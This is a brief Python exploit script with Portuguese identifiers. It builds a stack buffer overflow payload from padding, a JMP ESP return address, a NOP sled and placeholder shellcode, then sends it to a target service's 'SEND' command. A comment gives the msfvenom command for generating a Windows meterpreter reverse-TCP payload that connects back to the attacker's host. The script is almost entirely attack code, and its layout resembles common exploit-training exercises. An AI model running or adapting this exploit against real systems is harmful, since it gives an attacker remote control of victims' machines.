import socket
import time


def executar(ip_alvo, porta_alvo):
    #msfvenom -p windows/meterpreter/reverser_tcp LHOST=meu_ip LPORT=443 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c
    shellcode = ("shellcode_gerado")

    #endereÃ§o do JMP ESP 625012a0 -> little indian \xa0\x12\x50\x62
    buffer = "A" * 2007 + "\xa0\x12\x50\x62" + "\x90" * 32 + shellcode
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_alvo, porta_alvo))

    sock.recv(1024)
    sock.send("SEND " + buffer + "\r\n")
    time.sleep(1)
    sock.close()